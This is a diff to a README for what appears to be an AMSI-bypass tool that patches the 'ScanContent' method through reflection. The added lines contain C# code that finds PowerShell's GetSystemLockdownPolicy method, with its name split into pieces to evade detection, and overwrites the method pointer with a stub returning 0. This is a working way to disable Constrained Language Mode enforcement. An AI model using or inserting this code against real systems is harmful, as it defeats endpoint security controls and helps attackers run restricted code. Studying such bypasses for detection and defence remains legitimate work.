@@ -33,6 +33,17 @@ Uses reflection to get a handle to the "ScanContent" method and updates it to po
 - same technique should/could be applicable to bypass
   - ETW write
   - CLM enforcement
+   ```
+          public static void Troll()
+        {
+            MethodInfo o = typeof(System.Management.Automation.Alignment).Assembly.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetS" + "ystemLoc" + "kdow" + "nPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
+            MethodInfo t = typeof("<Insert Class here>").GetMethod("M", BindingFlags.Static | BindingFlags.NonPublic);
+            RuntimeHelpers.PrepareMethod(o.MethodHandle);
+            RuntimeHelpers.PrepareMethod(t.MethodHandle);
+            Marshal.Copy(new IntPtr[] { Marshal.ReadIntPtr(t.MethodHandle.Value + 8) }, 0, o.MethodHandle.Value + 8, 1);
+        }
+        private static int M() { return 0; }
+  ```
   - maybe there's more?
   
 ## Disclaimer
